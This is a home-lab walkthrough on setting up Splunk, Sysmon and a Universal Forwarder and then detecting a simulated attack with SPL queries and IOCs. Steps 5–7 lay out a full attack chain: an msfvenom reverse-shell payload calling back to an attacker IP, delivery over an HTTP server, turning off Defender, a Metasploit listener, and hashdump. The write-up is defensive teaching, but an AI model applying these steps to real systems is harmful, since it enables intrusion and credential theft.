# 🛡️ SIEM Home Lab Walkthrough – Splunk, Sysmon & Windows Security Logging

This document outlines the process of building a functional home SIEM lab using Splunk and Windows logging tools. It is written as technical lab notes, focusing on setup, troubleshooting, and security monitoring workflows.

The goal of this lab is to simulate how SOC analysts ingest logs, detect suspicious activity, and investigate potential attacks such as authentication abuse and network scanning.

---

## 🧱 Lab Environment

### Operating Systems
- Windows 10 Virtual Machine (Target / Log Source)
- Kali Linux (Attacker Machine)

### Tools Used
- Splunk Enterprise (SIEM Platform)
- Sysmon (Windows Event Logging Enhancement)
- Nmap (Network Reconnaissance)
- Metasploit Framework (Exploitation / Simulation)

### Objective
Simulate attacker behavior from Kali Linux and detect malicious activity on a Windows endpoint using Splunk and Sysmon logs.

---

## 🚀 Step 1 – Installing Splunk Enterprise

Splunk Enterprise was installed on a Windows 10 virtual machine to function as the SIEM platform. It is responsible for ingesting, indexing, and analyzing log data from endpoint sources.

After installation, Splunk Web was verified locally:

`http://127.0.0.1:8000`

This confirmed that the Splunk service was running correctly.
![image](https://hackmd.io/_uploads/SycdIii6-e.png)

---

## ⚠️ Step 2 – Install Sysmon and install Olaf Configuration

After setting up Splunk, Sysmon was installed on the Windows machine to enhance system logging capabilities. Sysmon provides detailed event-level visibility such as:

- Process creation events
- Network connections
- File creation timestamps
- Parent-child process relationships

Sysmon download:
https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon
![image](https://hackmd.io/_uploads/HJXoDsjaZe.png)

---

### 🔧 Sysmon Configuration (Olaf Hartong Config)

To improve logging quality and reduce noise, the Sysmon configuration file from Olaf Hartong was used. This configuration is widely used in SOC environments for structured telemetry collection.

GitHub Repository:
https://github.com/olafhartong/sysmon-modular/blob/master/sysmonconfig.xml

The configuration helps normalize logs and improves detection of suspicious behavior such as:
- Process injection
- Credential dumping attempts
- Suspicious network connections

---

## 🌐 Step 3 – Network Configuration Between Machines

Before launching any attacks, the two virtual machines need to be able to communicate with each other. This step verifies connectivity and identifies the IP addresses of both machines.

### Finding Your Kali IP Address

On the Kali Linux machine, run the following command to find your IP address:

```bash
ip a
```

Look for your active network interface (usually `eth0` or `ens33`). The IP address listed next to `inet` is what you'll use throughout the lab — write it down, as you'll need it when building the payload in a later step.

![SOC Evidence](https://hackmd.io/_uploads/Sy0XpSpCbl.png)

### Scanning the Windows Machine with Nmap

Next, use Nmap from Kali to scan the local network and confirm that the Windows machine is reachable:

```bash
nmap -sV 192.168.x.0/24
```

Replace `192.168.x.0/24` with your actual subnet. The scan results will show all active hosts. You should see your Windows VM appear as an active host, confirming the two machines can communicate.

![image](https://hackmd.io/_uploads/HJt4kUTRZg.png)

### Verifying Connectivity

The screenshots below show the network scan results confirming the Windows target is visible on the network. Key open ports (like 135, 139, 445) are typical of a Windows machine and indicate the target is ready for testing.

![image](https://hackmd.io/_uploads/HJu_1ITCZl.png)
![Screenshot 2026-05-09 201248](https://hackmd.io/_uploads/B1Aj6H6CWg.png)
![Screenshot 2026-05-09 201419](https://hackmd.io/_uploads/HJW-RrpCWx.png)
![Screenshot 2026-05-09 201538](https://hackmd.io/_uploads/HJKrCB6AWx.png)
![Screenshot 2026-05-09 201628](https://hackmd.io/_uploads/HkmO0r60bl.png)
![image](https://hackmd.io/_uploads/SyDcCBpCbe.png)
![image](https://hackmd.io/_uploads/BJyoyU60Ze.png)
![image](https://hackmd.io/_uploads/S11ay8TRWg.png)
![image](https://hackmd.io/_uploads/SJiC1U60bg.png)
![image](https://hackmd.io/_uploads/HkmgxIpA-x.png)

---

## 📦 Step 4 – Setting Up the Splunk Universal Forwarder

The **Splunk Universal Forwarder** is a lightweight agent installed on the Windows target machine. Its job is to collect logs and send them to your Splunk Enterprise instance in real time. Without this, Splunk wouldn't receive any data from the Windows machine.

### Download the Universal Forwarder

Download the Splunk Universal Forwarder for Windows from the official site:

https://www.splunk.com/en_us/download/universal-forwarder.html

Choose the Windows 64-bit `.msi` installer.

### Install the Forwarder

Run the installer on the Windows VM. During installation:

1. Accept the license agreement
2. Set a username and password for the forwarder (e.g., `admin`)
3. When asked for the **Deployment Server**, you can skip this for a home lab
4. When asked for the **Receiving Indexer**, enter the IP of your Splunk machine and port `9997`

> **Note:** Port `9997` is the default port Splunk Enterprise listens on to receive forwarded data. Make sure it is enabled in Splunk under **Settings → Forwarding and Receiving → Configure Receiving**.

### Configure Inputs (inputs.conf)

Tell the forwarder what logs to collect by editing or creating the `inputs.conf` file:

**File location:**
```
C:\Program Files\SplunkUniversalForwarder\etc\system\local\inputs.conf
```

Add the following to collect Windows Event Logs and Sysmon:

```ini
[WinEventLog://Application]
index = wineventlog
disabled = false

[WinEventLog://Security]
index = wineventlog
disabled = false

[WinEventLog://System]
index = wineventlog
disabled = false

[WinEventLog://Microsoft-Windows-Sysmon/Operational]
index = sysmon
disabled = false
renderXml = true
```

### Restart the Forwarder

After saving the config, restart the forwarder service so it picks up the new settings:

```powershell
Restart-Service SplunkForwarder
```

Or restart it through **Services** in Windows (search "Services" in the Start Menu → find `SplunkForwarder` → right-click → Restart).

### Verify Data is Flowing

In Splunk Web (`http://127.0.0.1:8000`), go to **Search & Reporting** and run:

```spl
index=sysmon | head 10
```

If you see results, the forwarder is working correctly and logs are being ingested.

---

## 💣 Step 5 – Creating the Payload with msfvenom

Now it's time to create a malicious payload on the Kali machine. This payload will be a file that, when run on the Windows machine, opens a reverse connection back to Kali — simulating what a real attacker might deliver via a phishing email or malicious download.

> **⚠️ Reminder:** This is for educational use only in a controlled lab environment. Never run these commands against systems you don't own or have permission to test.

### What is msfvenom?

`msfvenom` is a tool in the Metasploit Framework used to generate payloads. It combines the old `msfpayload` and `msfencode` tools into one. We'll use it to create a Windows executable that connects back to our Kali machine.

### Generate the Payload

On your Kali Linux machine, run:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<YOUR_KALI_IP> LPORT=4444 -f exe -o malware.exe
```

**Breaking down the command:**

| Flag | Meaning |
|------|---------|
| `-p windows/x64/meterpreter/reverse_tcp` | The payload type — a 64-bit Windows reverse shell using Meterpreter |
| `LHOST=<YOUR_KALI_IP>` | The IP address the payload will connect back to (your Kali machine) |
| `LPORT=4444` | The port the payload will connect back on |
| `-f exe` | Output format — a Windows `.exe` file |
| `-o malware.exe` | The output filename |

Replace `<YOUR_KALI_IP>` with the IP you found in Step 3.

### Transfer the Payload to Windows

You need to move `malware.exe` from Kali to the Windows VM. In a home lab, the easiest options are:

- **Python HTTP server** (from Kali): `python3 -m http.server 8080`, then browse to `http://<KALI_IP>:8080` from the Windows machine and download the file
- **Shared folder** between your VMs in VirtualBox/VMware
- **USB drag-and-drop** if your VM software supports it

> **Tip:** Windows Defender will likely flag and delete `malware.exe`. For the lab to work, you'll need to temporarily disable real-time protection on the Windows VM under **Windows Security → Virus & Threat Protection → Manage Settings**.

---

## 🎧 Step 6 – Setting Up the Metasploit Listener

Before running the payload on Windows, you need to set up a **listener** on Kali. This is the process that waits for the Windows machine to "call home" after the payload is executed. Without a listener running, the connection has nowhere to go.

### Launch Metasploit

On your Kali machine, open a terminal and start Metasploit:

```bash
msfconsole
```

This will load the Metasploit Framework console. It may take a moment to start up.

### Configure the Handler

Once inside `msfconsole`, set up the listener using the `multi/handler` module:

```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <YOUR_KALI_IP>
set LPORT 4444
run
```

> **Important:** The `payload`, `LHOST`, and `LPORT` values here must exactly match what you used when creating the payload in Step 5. If they don't match, the connection will fail.

### What to Expect

After running `run`, Metasploit will display something like:

```
[*] Started reverse TCP handler on 192.168.x.x:4444
```

This means the listener is active and waiting. Leave this terminal window open — it will receive the connection when the payload is executed on Windows in the next step.

---

## 💻 Step 7 – Executing the Payload and Getting a Shell

With the listener running on Kali, it's time to execute the payload on the Windows VM. This simulates the victim opening a malicious file.

### Run the Payload on Windows

On the Windows VM, navigate to wherever you saved `malware.exe` and double-click it (or run it from Command Prompt). The file will appear to do nothing visible — that's expected. Behind the scenes, it is connecting back to your Kali machine.

### Receiving the Meterpreter Session

Back on your Kali machine, Metasploit should show a new session opening:

```
[*] Sending stage (201798 bytes) to 192.168.x.x
[*] Meterpreter session 1 opened (192.168.x.x:4444 -> 192.168.x.x:XXXXX)

meterpreter >
```

You now have an active **Meterpreter shell** — a remote command-line session on the Windows machine. This is the same type of access an attacker would have after successfully compromising a system.

### Exploring the Session (Optional)

A few useful Meterpreter commands to simulate attacker activity that Splunk will log:

```bash
sysinfo           # Get system information
getuid            # Show current user
shell             # Drop into a Windows command shell
ps                # List running processes
hashdump          # Attempt to dump password hashes (requires elevated privileges)
```

Each of these actions will generate events in Windows/Sysmon logs — exactly what we want to detect in the next step.

> **Tip:** Run a few commands to generate log noise. The more activity you produce, the more interesting your Splunk queries will be.

---

## 🔍 Step 8 – Detecting the Attack in Splunk

This is the core of the SOC analyst workflow. Now that an attack has been simulated, we switch over to Splunk to find evidence of what happened. A good analyst treats logs like a crime scene — every action leaves a trace.

### Open Splunk Search

Go to `http://127.0.0.1:8000` and navigate to **Search & Reporting**.

All searches below should be run with the time range set to **Last 15 minutes** or **Last 60 minutes** depending on when you ran the payload.

---

### 🔎 Query 1 – Detect the Reverse Shell Connection (Sysmon Event ID 3)

Sysmon Event ID 3 logs **network connections** made by processes. When `malware.exe` connected back to Kali, it generated one of these events.

```spl
index=sysmon EventID=3 
| table _time, host, Image, DestinationIp, DestinationPort, User
| sort -_time
```

**What to look for:** A process (likely `malware.exe` or an unexpected system process) making an outbound connection to your Kali IP on port `4444`.

---

### 🔎 Query 2 – Detect Suspicious Process Creation (Sysmon Event ID 1)

Sysmon Event ID 1 logs every **process creation** event, including the full command line used. This is extremely useful for spotting suspicious executions.

```spl
index=sysmon EventID=1 
| table _time, host, Image, CommandLine, ParentImage, User
| sort -_time
```

**What to look for:** `malware.exe` appearing in the `Image` field, or unusual processes like `cmd.exe` or `powershell.exe` being spawned from unexpected parent processes.

---

### 🔎 Query 3 – Look for Credential Access Attempts (Windows Event ID 4624 / 4625)

If you ran `hashdump` in Meterpreter, it may have triggered authentication-related events. Windows logs logins and login failures using Event IDs 4624 (success) and 4625 (failure).

```spl
index=wineventlog (EventCode=4624 OR EventCode=4625)
| table _time, host, EventCode, Account_Name, Logon_Type, Source_Network_Address
| sort -_time
```

**What to look for:** Unexpected login attempts, especially from unfamiliar source IPs or using system-level accounts.

---

### 🔎 Query 4 – Detect Nmap Scan Activity

The Nmap scan from Step 3 also generated logs. You can find evidence of the scan by looking for a high volume of failed connection attempts in a short time window.

```spl
index=wineventlog EventCode=5156 OR EventCode=5157
| stats count by SourceAddress, DestPort
| sort -count
```

**What to look for:** A single source IP (your Kali machine) attempting connections to many different ports in a short period — a classic port scan signature.

---

### 🔎 Query 5 – Build a Timeline of Events

To understand the full attack chain, build a timeline of all Sysmon activity from the attack window:

```spl
index=sysmon 
| table _time, EventID, host, Image, CommandLine, DestinationIp, User
| sort _time
```

This gives you a chronological view of what happened — from the initial scan, to the payload execution, to any post-exploitation commands.

---

## 📊 Step 9 – Analysis & Findings Summary

### What We Simulated

This lab walked through a basic **attack lifecycle** from the perspective of both an attacker and a defender:

| Phase | Action |
|-------|--------|
| **Reconnaissance** | Nmap scan to discover the Windows target |
| **Weaponization** | msfvenom payload created on Kali |
| **Delivery** | Payload manually transferred to Windows (simulating a download) |
| **Exploitation** | Payload executed, establishing a Meterpreter reverse shell |
| **Post-Exploitation** | System info gathered, processes listed, credentials attempted |
| **Detection** | Splunk + Sysmon logs reviewed to identify all attacker activity |

---

### Key Indicators of Compromise (IOCs)

Based on the Splunk investigation, the following **Indicators of Compromise** were identified:

- **Suspicious outbound connection** – A process (`malware.exe`) made an outbound TCP connection to an external IP on port `4444` (Sysmon Event ID 3)
- **Unusual process execution** – An unsigned executable ran from a non-standard directory (Sysmon Event ID 1)
- **Spawned shell process** – `cmd.exe` was launched as a child of `malware.exe`, a common indicator of shell access (Sysmon Event ID 1)
- **Port scan signature** – A high volume of connection attempts from a single IP across multiple ports in a short window

---

### Detection Gaps & Improvements

While this lab successfully demonstrated detection, a real SOC environment would benefit from additional hardening:

- **Alert rules** – Create Splunk alerts to notify analysts in real time when Sysmon Event ID 3 fires on unusual ports (e.g., 4444, 4445)
- **Application whitelisting** – Tools like Windows Defender Application Control (WDAC) would prevent unsigned executables from running in the first place
- **Endpoint Detection & Response (EDR)** – A dedicated EDR solution (e.g., Microsoft Defender for Endpoint, CrowdStrike) provides even richer telemetry than Sysmon alone
- **Network segmentation** – Properly segmented VLANs would limit the blast radius if a machine is compromised
- **MITRE ATT&CK mapping** – Each detected behavior maps to MITRE ATT&CK techniques (e.g., T1059 – Command and Scripting Interpreter, T1049 – System Network Connections Discovery)

---

### Lessons Learned

This project reinforced several core SOC concepts:

1. **Logs are only useful if you're collecting them** – Sysmon dramatically improved visibility over default Windows logging
2. **Attackers leave traces at every step** – From the initial scan to post-exploitation, every action generated detectable events
3. **Context matters** – A single event may not mean much, but correlating process creation + network connection + shell spawning tells a clear story
4. **Defense is a cycle** – Simulate, detect, improve, repeat

---

*Lab completed successfully. All detection objectives met using Splunk and Sysmon in a controlled home lab environment.*
![image](https://hackmd.io/_uploads/HJu_1ITCZl.png)
![Screenshot 2026-05-09 201248](https://hackmd.io/_uploads/B1Aj6H6CWg.png)
![Screenshot 2026-05-09 201419](https://hackmd.io/_uploads/HJW-RrpCWx.png)
![Screenshot 2026-05-09 201538](https://hackmd.io/_uploads/HJKrCB6AWx.png)
![Screenshot 2026-05-09 201628](https://hackmd.io/_uploads/HkmO0r60bl.png)
![image](https://hackmd.io/_uploads/SyDcCBpCbe.png)
![image](https://hackmd.io/_uploads/BJyoyU60Ze.png)
![image](https://hackmd.io/_uploads/S11ay8TRWg.png)
![image](https://hackmd.io/_uploads/SJiC1U60bg.png)
![image](https://hackmd.io/_uploads/HkmgxIpA-x.png)








---
